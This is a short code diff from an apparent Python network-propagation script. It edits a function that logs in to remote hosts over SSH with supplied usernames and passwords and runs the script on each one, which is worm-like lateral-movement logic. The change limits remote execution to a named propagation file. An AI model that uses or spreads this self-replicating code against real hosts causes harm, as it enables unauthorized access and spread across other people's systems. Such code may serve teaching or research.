@@ -367,10 +367,14 @@ def propagate_script(ip, port, login_string):
                 client.connect(hostname=str(ip), port=int(port),
                                username=str(login_string_split[0]),
                                password=str(login_string_split[1]))
-                client.exec_command(strings.run_script_command(
-                    os.path.basename(__file__), login_string_split[0]))
-                client.close()
-                return True
+                if os.path.basename(__file__) == strings.NET_PROPAGATION:
+                    client.exec_command(strings.run_script_command(
+                        os.path.basename(__file__)))
+                    client.close()
+                    return True
+                else:
+                    client.close()
+                    return False
 
             except RuntimeError:
                 client.close()
